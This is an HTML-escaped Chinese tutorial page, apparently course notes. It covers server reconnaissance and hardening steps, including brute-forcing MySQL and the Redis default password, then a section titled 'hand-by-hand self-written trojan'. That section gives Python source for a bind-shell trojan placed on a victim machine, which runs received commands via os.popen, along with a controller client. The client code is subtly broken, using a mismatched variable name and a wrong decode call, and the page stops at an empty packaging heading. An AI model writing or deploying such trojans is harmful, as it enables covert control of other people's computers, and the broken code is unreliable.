&lt;h1 id=&#34;310-服务器安全加固&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#310-服务器安全加固&#34;&gt;#&lt;/a&gt; 3.10 服务器安全加固&lt;/h1&gt;
&lt;p&gt;给出服务器的 ssh 账号密码&lt;/p&gt;
&lt;p&gt;例子为 zzcms 网站 (相关漏洞可以搜索查找)&lt;/p&gt;
&lt;h2 id=&#34;获取服务器的系统信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取服务器的系统信息&#34;&gt;#&lt;/a&gt; 获取服务器的系统信息&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; /etc/*release*&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;查看开启端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看开启端口&#34;&gt;#&lt;/a&gt; 查看开启端口&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;netstat&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-antp&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;发现开启 3306 (mysql),6379 (redis),22 (ssh),80 (http)&lt;/p&gt;
&lt;h2 id=&#34;查看进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看进程&#34;&gt;#&lt;/a&gt; 查看进程&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ps&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-ef&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;显示所有进程&lt;/p&gt;
&lt;h2 id=&#34;找寻突破口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找寻突破口&#34;&gt;#&lt;/a&gt; 找寻突破口&lt;/h2&gt;
&lt;h3 id=&#34;3306-mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3306-mysql&#34;&gt;#&lt;/a&gt; 3306 mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;找寻配置文件，查看是否有密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆破进入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;是否允许远程登录 (通过数据库访问，查看数据库用户信息 (user 表))&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查表，查看各种账户信息 (管理员之类的账号，根据其密码形式 (如弱密码)，进行修改 (网页修改 / 数据库修改))&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6379-redis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6379-redis&#34;&gt;#&lt;/a&gt; 6379 redis&lt;/h3&gt;
&lt;p&gt;查看启动目录下的 redis 脚本 &lt;code&gt;vim /etc/init.d/redis&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;redis 默认密码 &lt;code&gt;foobared&lt;/code&gt;  修改密码&lt;/p&gt;
&lt;p&gt;修改好后需要重启&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;再次运行 redis 脚本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果上面一条不行，那么可以使用 kill 杀掉进程&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;首先使用 &lt;code&gt;ps -ef | grep redis&lt;/code&gt;  获取进程号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后使用 kill 命令 &lt;code&gt;kill 进程号&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;311-手把手自编木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#311-手把手自编木马&#34;&gt;#&lt;/a&gt; 3.11 手把手自编木马&lt;/h1&gt;
&lt;h2 id=&#34;自编远程控制电脑木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自编远程控制电脑木马&#34;&gt;#&lt;/a&gt; 自编远程控制电脑木马&lt;/h2&gt;
&lt;h3 id=&#34;涉及知识或技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#涉及知识或技术&#34;&gt;#&lt;/a&gt; 涉及知识或技术&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;操作系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;win/linux/android&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;命令、服务、特性 (不同系统下)、&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络协议&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;osi 七层网络&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;tcp/ip 协议族群&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用层&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;传输层 /tcp/udp&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络层&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;链路层&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;程序语言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;python&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;环境简单&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;弱规则&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第三方库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;以及自定义的库或模块&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;go&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ruby&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;html，js&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打包工具&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;编写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写&#34;&gt;#&lt;/a&gt; 编写&lt;/h3&gt;
&lt;p&gt;server&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# server: 放在被攻击机 - 木马&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# dos 下&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; socket &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建连接 tcp&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 绑定主机 ip&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;address &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12345&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;address&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;listen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    newsct&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; clientsct &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; qq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;accept&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        cmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; newsct&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#接收到的各种指令，4096 为大小&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# 判断 cmd 是否有内容&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;console:&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; cmd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;# 以下可以做控制操作&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;popen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            newsct&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    newsct&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;client&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# client 控制端&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; socket &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tcpsocket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;AF_INET&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;SOCK_STREAM&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;setAddress &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;127.0.0.1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12345&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tcpsocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;setAddress&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    sendcmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;client&amp;gt;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sendcmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        tcpsocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sendcmd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 接收执行后的结果&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    resv &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; tcpsocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# close&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;tcpsocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;打包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打包&#34;&gt;#&lt;/a&gt; 打包&lt;/h3&gt;
